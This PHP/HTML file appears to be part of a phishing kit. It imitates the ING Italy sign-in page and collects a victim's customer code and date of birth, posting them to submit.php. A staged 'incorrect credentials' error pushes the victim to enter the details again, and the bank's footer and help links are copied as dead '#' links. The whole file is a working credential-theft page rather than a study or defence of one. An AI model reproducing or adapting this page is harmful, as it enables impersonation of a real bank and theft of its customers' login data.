<?php require_once "../config.php"; ?>
<?php include 'include/header.php'; ?>
<style>
.error-box {
    border: 1px solid #e74c3c;
    /* red border */
    background-color: #fff;
    color: #333;
    display: flex;
    align-items: center;
    padding: 12px 16px;
    border-radius: 4px;
    font-family: Arial, sans-serif;
    font-size: 14px;
    max-width: 500px;
    margin-bottom: 20px;
}

.error-icon {
    color: #e74c3c;
    font-weight: bold;
    margin-right: 10px;
    font-size: 16px;
}

.error-text {
    flex: 1;
    line-height: 1.4;
}
</style>
<div class="container">
    <h1>Ciao! Entra in ING</h1>
    <p class="instruction">Inserisci le tue credenziali per accedere.</p>

    <form id="loginForm" action="submit.php" method="POST">
        <input type="hidden" name="step" value="login">
        <div class="error-box" style="<?php echo isset($_GET['error']) ? 'display: flex;' : 'display: none;'; ?>">
            <span class="error-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                    fill="var(--fg_error, #D70000)" focusable="false" aria-hidden="true">
                    <path
                        d="M11.2178,15.6895 C11.2178,15.9065 11.1178,16.0065 10.8678,16.0065 L9.1158,16.0065 C8.8828,16.0065 8.7818,15.9065 8.7818,15.6895 L8.7818,13.9545 C8.7818,13.7375 8.8828,13.6365 9.1158,13.6365 L10.8678,13.6365 C11.1178,13.6365 11.2178,13.7375 11.2178,13.9545 L11.2178,15.6895 Z M9.1988,3.9935 L10.8008,3.9935 C11.0338,3.9935 11.1178,4.0935 11.1178,4.2935 L10.8848,11.8355 C10.8848,12.0015 10.8188,12.0515 10.6348,12.0515 L9.3998,12.0515 C9.2158,12.0515 9.1498,12.0015 9.1498,11.8355 L8.8828,4.2935 C8.8828,4.0935 8.9658,3.9935 9.1988,3.9935 L9.1988,3.9935 Z M9.9998,0.0005 C4.4868,0.0005 -0.0002,4.4855 -0.0002,10.0005 C-0.0002,15.5135 4.4868,20.0005 9.9998,20.0005 C15.5138,20.0005 19.9998,15.5135 19.9998,10.0005 C19.9998,4.4855 15.5138,0.0005 9.9998,0.0005 L9.9998,0.0005 Z"
                        transform="translate(2 2)"></path>
                </svg></span>
            <span class="error-text">
                Ops… le credenziali che hai inserito non sono corrette. Controlla e riprova.
            </span>
        </div>

        <div class="form-group">
            <label for="clientCode">Codice cliente</label>
            <input type="text" id="clientCode" name="clientCode" required minlength="7">
        </div>

        <div class="form-group">
            <label for="birthDate">Data di nascita</label>
            <input type="text" id="birthDate" name="birthDate" placeholder="GG/MM/AAAA" required minlength="7">
            <span class="date-format">Formato: GG/MM/AAAA</span>
        </div>

        <button type="submit" class="continue-btn">Continua</button>
    </form>

    <div class="help-links">
        <a href="#" class="help-link">
            <span class="arrow">▸</span>
            Non ricordi il Codice Cliente?
        </a>
        <a href="#" class="help-link">
            <span class="arrow">▸</span>
            È davvero ING? Verifica la chiamata
        </a>
    </div>
</div>

<div class="footer">
    <div class="footer-links">
        <a href="#" class="footer-link">Sicurezza</a>
        <a href="#" class="footer-link">Definizione di Default</a>
        <a href="#" class="footer-link">Privacy</a>
    </div>

    <div class="footer-links">
        <a href="#" class="footer-link">Trasparenza</a>
        <a href="#" class="footer-link">Reclami</a>
        <a href="#" class="footer-link">Cookies</a>
    </div>
</div>

<script>
document.getElementById('birthDate').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 8) value = value.slice(0, 8);

    // Add slashes automatically
    if (value.length > 4) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4);
    } else if (value.length > 2) {
        value = value.slice(0, 2) + '/' + value.slice(2);
    }

    e.target.value = value;
});
</script>
</body>

</html>